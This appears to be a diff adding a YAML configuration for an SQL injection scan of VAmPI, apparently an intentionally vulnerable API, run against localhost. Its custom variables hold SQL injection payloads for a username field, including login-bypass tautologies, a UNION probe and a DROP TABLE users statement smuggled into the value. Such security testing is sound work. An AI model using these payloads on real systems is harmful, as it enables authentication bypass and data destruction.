@@ -1,0 +1,22 @@
+# SQL Injection focused scan for VAmPI
+# Targets endpoints known to be vulnerable to SQLi when vuln=1
+app:
+  applicationId: ${APP_ID:06b1c634-4c0b-4e76-8fcd-3f81af787383}
+  env: ${APP_ENV:dev-sqli-focus}
+  host: ${APP_HOST:http://localhost:5000}
+
+  openApiConf:
+    filePath: openapi_specs/openapi3.yml
+    includeAllMethods: true
+
+    # SQL injection payloads for username parameter
+    customVariables:
+      - field: username
+        values:
+          - "admin' OR '1'='1"
+          - "admin' OR 1=1--"
+          - "admin' OR 1=1#"
+          - "' UNION SELECT NULL--"
+          - "admin'; DROP TABLE users--"
+          - "name1"
+          - "name2"
